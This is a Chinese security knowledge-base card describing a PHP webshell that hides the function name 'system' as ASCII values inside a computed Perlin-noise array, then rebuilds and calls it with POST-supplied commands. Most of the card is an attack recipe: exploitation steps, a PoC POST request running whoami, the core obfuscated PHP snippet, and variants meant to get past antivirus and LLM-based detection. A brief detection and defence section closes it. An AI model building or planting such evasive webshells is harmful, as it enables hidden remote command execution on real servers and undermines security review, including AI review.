---
id: web-php-rce-webshell-algorithmic-array-byte-carrier
title: 算法生成数组当字节载体：把函数名切成 ASCII 值塞进噪声数组，用状态机派生偏移量切片还原
type: scenario
domain: web
path: web/php/rce
technique: php-webshell-algorithmic-array-byte-carrier
tags:
- php
- webshell
- av-bypass
- obfuscation
- byte-carrier
- array-slice
- dynamic-call
- ai-detection
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W4
  verified_at: '2026-11-08T13:58:32+08:00'
  notes: 已对照原文核对：PerlinNoise 构造参数(arrLength,700.4,56.7,'DIFF_PERLIN')、BAD_ARGS 注入分支 i>userans+391 且 i<userans+398、\ 六个 \+常数 表达式、array_slice 偏移 (188*2)+\*3 与长度 \-3、array_map+chr+strrev+sprintf、\(\) 均与原文一致；userans=8 时取 [109,101,116,115,121]→metsy→strrev→ystem，配 b=s 得 system，算术逐个复算正确。未验证点：\=8 由 ABBCCD 末态求和推出，与卡片一致但原文未显式写出该值；'whoami 回显'未见独立截图；未执行任何 PHP 代码。
url: /docs/web/php/rce/web-php-rce-webshell-algorithmic-array-byte-carrier/
draft: false
kb_aliases:
- PerlinNoise WebShell
- 柏林噪声免杀马
- array_slice 字节载体
- 噪声数组藏函数名
- chr 反推函数名
---

## 一句话结论

不把函数名字符串写进文件，而是让一段"业务算法"（柏林噪声）正常算出大数组，再在特定下标写入一组由同一个业务变量做算术推导出的 ASCII 值，最后用 `array_slice($arr, 188*2+$n*3, $n-3)` 按该变量派生的偏移切片、`array_map('chr', ...)` 转字符、`strrev` 反序并与另一个单字母变量拼接成 `system`，即可在文件中既无 `system` 字面量也无 base64/取反特征的情况下完成变量函数调用。

## 原理

- **载体是"算出来的数组"**：`PerlinNoise` 用 `mt_rand`/`rand` 生成 `seeds_array` 与 `inputNumArray`，再按 `grad*(x - round(x))` 的插值公式逐点计算 `perlin_noise`。这个数组是**数百到数千个浮点数**，任何静态特征匹配都只会看到"数学运算"。
- **注入靠业务分支**：构造函数里 `source="DIFF_PERLIN"` 会把 `BAD_ARGS` 置真；`__CPRBB0R0_l()` 循环中当 `BAD_ARGS && $i > $userans+391 && $i < $userans+398` 时，不再走插值，而是从 `array($userans+101, $userans+93, $userans+108, $userans+107, 105+$userans+8, 110+$userans+57-60)` 里取第 `$i-400` 个值 push 进数组。也就是说**注入点的位置与数值都由 `$userans` 决定**。
- **偏移量同源**：`$userans` 由前置谜题状态机算出（四块全等时 `blockA+blockB+blockC+blockD`，原文正解给出 8）。切片参数 `(188*2)+$userans*3 = 400`、长度 `$userans-3 = 5`，正好落在注入区间内，于是取到 5 个 ASCII 值。
- **为什么这 5 个值能拼成函数名**：`userans=8` 时六个候选值依次是 109(`m`)、101(`e`)、116(`t`)、115(`s`)、121(`y`)、115(`s`)；切片取前 5 个得 `m e t s y`，`strrev` 反序成 `ystem`，再与 `$b`（POST 可控的单字母 `s`）拼接得 `system`。数值表达式全部写成 `$userans+常数` 的形态，读起来是"噪声区间常用偏移"，看不出与字符集有关。
- **调用**：`$c = strval(sprintf("%s%s",$b, ...)); $c($pcs);` 变量函数调用；`$b`、`$pcs` 由外层 `$$key` 批量变量注册从 POST 注入。
- 与"取反/base64 分段"的区别：那里是**存储编码**（密文写在文件里），这里是**计算生成**（明文值从不出现，连密文也不是常量，而是运行时算出来的浮点数组元素）；扫描器既找不到敏感字面量，也找不到"解密"特征函数，只能看到插值与切片。

## 触发条件

- PHP 允许 `array_map`、`array_slice`、`sprintf`、`chr` 以及最终目标函数（`system`/`exec`/`shell_exec` 等）；
- 前置门控（如状态机/校验）已提供确定性的 `$userans`，否则注入区间与切片参数对不上；
- `arrLength` 须足够大（原文限制 3000–9999，且切片下标在数组长度内），否则切片为空；
- 目标防护偏静态内容检测或 LLM 判读，缺少强运行时行为监控。

## 利用步骤

1. 选定要还原的函数名（如 `system`），拆成"反转后剩余部分 + 单字母前缀"（`s` + `ystem`）。
2. 选定一个业务派生整数 `$n`（如谜题状态和），把注入下标设为 `376+$n*3`、切片长度设为 `$n-3`，并让注入的数值表按 `$n+常数` 的形式生成对应 ASCII 值（倒序排列，交给 `strrev` 还原）。
3. 构造噪声生成循环：非注入区间走正常插值公式（保证代码"看起来是算法"），注入区间 `continue` 跳过公式直接 push。
4. 在文件末尾用 `$c = $b . strrev(implode('', array_map('chr', array_slice($noise, 376+$n*3, $n-3))))` 组装函数名，再 `$c($pcs)` 调用；`$b`、`$pcs` 由 `$$key` 从 POST 注入。
5. 发 POST `wpstring=<正解>&b=s&pcs=whoami`，验证回显；需换函数时改 `$b` 与数值表偏移。

## PoC

```http
POST /shell/1.php HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded

wpstring=ABBCCD&b=s&pcs=whoami
```

关键还原片段（原文结构）：

```php
// 注入：$i 落在 [userans+392, userans+398) 时用算术表，而非插值公式
$result = array($userans+101, $userans+93, $userans+108,
                $userans+107, 105+$userans+8, 110+$userans+57-60);
array_push($this->perlin_noise, $result[$i - 400]);
continue;

// 还原：偏移与长度都由同一个 $userans 派生
$ab = pause(array_map(fn($x) => chr($x),
      array_slice($this->perlin_noise, (188*2)+$userans*3, $userans-3)));
$c  = strval(sprintf("%s%s", $b, pause(strrev(implode("", pause($ab))))));
$c($pcs);
```

`$userans=8` 时：偏移 400、长度 5 → 取 `[109,101,116,115,121]` → `metsy` → `strrev` → `ystem`；配合 `b=s` 得 `system`。

## 变体与关联

- 变体：把柏林噪声换成任意"会生成大数组"的业务算法（图像灰度、哈希扩散、随机矩阵、FFT 结果），只要数组长度够、注入位置可算即可。
- 变体：字符不一定要倒序——`strrev` 是为了让数值表看起来像递增的偏移；也可以改用 `str_rot13`、`base_convert`、XOR 掩码做最后一步还原。
- 变体：注入区间可用多段分散（每个字符落在不同区间），进一步避免"连续 5 个整数"这种可疑结构。
- 关联：[[web-php-rce-webshell-string-not-dynamic-call-av-bypass]]（同为 `$c($arg)` 变量调用收尾，但隐藏手段是存储编码而非计算生成）。
- 关联：[[web-php-rce-webshell-business-data-carrier-obfuscation]]（把载荷藏进业务数据结构；本卡是把业务算法当载体并把偏移量同源派生）。
- 关联：[[web-php-rce-webshell-puzzle-state-gate-av-bypass]]（提供 `$userans` 的门控外壳，两卡常组合使用）。
- 边界：注入依赖 `$userans` 的具体取值，换正解则偏移与数值表需同步重算；数组长度/边界配错时切片为空、`$c` 变成空串而报"函数不存在"。

## 检测与防御

- 检测：关注"大型数值数组 + `array_slice` + `chr`/`array_map` + `strrev`/`sprintf` 组合"的文件；对 `$$key` 批量注册变量后出现变量函数调用的脚本提级审查；运行时监控 PHP 子进程与 `system` 调用栈。
- 防御：`disable_functions` 关闭执行类函数、上传目录禁写与禁止解析、内容层面做 AST 级检测（变量函数调用 + 动态变量拼接）而非仅关键字；EDR/RASP 以行为为主。
